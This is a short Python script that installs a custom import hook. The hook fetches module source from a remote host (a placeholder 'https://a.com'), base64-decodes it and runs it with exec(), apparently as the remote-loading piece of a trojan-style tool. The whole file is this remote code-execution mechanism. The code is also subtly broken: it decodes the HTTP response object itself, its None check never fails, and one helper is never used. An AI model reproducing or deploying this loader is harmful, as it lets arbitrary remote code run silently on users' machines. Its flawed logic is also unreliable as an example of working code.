import base64
import importlib.util
import sys
import requests
from importlib.abc import MetaPathFinder


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class HTTPImporter(MetaPathFinder):
    session = None

    def __init__(self, url):
        self.url = url
        self.repo = None

        if HTTPImporter.session is None:
            HTTPImporter.session = requests.Session()
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        new_library = HTTPImporter.session.get(''.join([self.url, name.replace(".", "/")]))
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.url, is_package=True)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(HTTPImporter("https://a.com"))
    print(sys.meta_path)
